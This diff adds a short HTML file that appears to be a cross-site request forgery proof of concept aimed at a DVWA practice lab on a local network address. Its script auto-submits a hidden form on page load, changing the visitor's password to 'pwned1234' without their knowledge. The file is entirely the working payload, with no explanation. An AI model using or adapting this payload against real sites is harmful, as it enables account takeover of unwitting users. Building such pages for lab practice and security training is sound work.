@@ -1,0 +1,13 @@
+<script>
+window.onload = function() {
+   document.getElementById('form').submit();
+}
+</script>
+<form id='form' action='http://10.0.2.15/dvwa/vulnerabilities/csrf/' method='GET'>
+	<input type="hidden" autocomplete="off" name="password_new" value="pwned1234" />
+	<input type="hidden" autocomplete="off" name="password_conf" value="pwned1234" />
+	<input type="hidden" autocomplete="off" name="Change" value="Change" />
+	<br />
+	<input type="submit" />
+</form>	
+
